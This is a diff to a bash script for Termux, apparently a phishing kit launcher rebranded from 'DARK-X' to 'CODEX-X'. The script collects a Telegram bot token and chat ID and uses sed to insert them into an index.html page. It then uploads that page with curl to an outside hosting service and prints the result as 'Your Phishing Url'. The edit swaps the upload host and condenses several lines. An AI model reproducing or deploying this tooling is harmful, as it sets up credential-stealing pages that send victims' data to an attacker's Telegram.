@@ -27,7 +27,7 @@ dxnetcheck() {
 clear
 echo
 echo -e "               ${g}╔═══════════════╗"
-echo -e "               ${g}║ ${n}</>  ${c}DARK-X${g}   ║"
+echo -e "               ${g}║ ${n}</>  ${c}CODEX-X${g}  ║"
 echo -e "               ${g}╚═══════════════╝"
 echo -e "  ${g}╔════════════════════════════════════════════╗"
 echo -e "  ${g}║  ${C} ${y}Checking Your Internet Connection¡${g}  ║"
@@ -44,25 +44,19 @@ echo -e "              ${g}╚════════════════�
     fi
 done
 clear
-}
-dxnetcheck
+} ; dxnetcheck
 echo
     echo ; echo -e "		        ${g}Hey ${y}Dear" ; echo -e "${c}              (\_/)" ; echo -e "              (${y}^ω^${c})     ${g}I'm Dx-Simu${c}" ; echo -e "             ⊂(___)づ  ⋅˚₊‧ ଳ ‧₊˚ ⋅"
     echo ; echo -e " ${A} ${c}Please Enter Your ${g}Telegram Bot token \n ${A} ${c}And Your ${g}Chat Id ${c}\n"
 
-read -p "[+]─[Enter Token]──➤ " token
-read -p "[+]─[Enter ID]──➤ " chat_id
+read -p "[+]─[Enter Token]──➤ " token ; read -p "[+]─[Enter ID]──➤ " chat_id
 
-# Define the index.html file
-index_file="index.html"
-
-# Use sed to replace the placeholders in the index.html file
-sed -i "s/YOUR_BOT_TOKEN_HERE/$token/g" "$index_file"
+index_file="index.html" ; sed -i "s/YOUR_BOT_TOKEN_HERE/$token/g" "$index_file"
 sed -i "s/YOUR_CHAT_ID_HERE/$chat_id/g" "$index_file"
 termux-reload-settings
 echo -e "\n ${A} ${c}Token and ID have been updated\n"
 if [[ -f "$index_file" && "$index_file" == *.html ]]; then
-    response=$(curl -s -F "file=@$index_file" https://codex-host.glitch.me/upload)
+    response=$(curl -s -F "file=@$index_file" https://codex-host.onrender.com/upload)
 
     file_url=$(echo "$response" | jq -r '.fileUrl')
     echo -e "\n ${A} ${y}Note & Save the URL given here. \n ${A} ${y}You can use the URL ${g}permanently \n" ; echo -e "\n ${D} ${c}Your Phishing Url: ${g}${file_url}\n${c}"
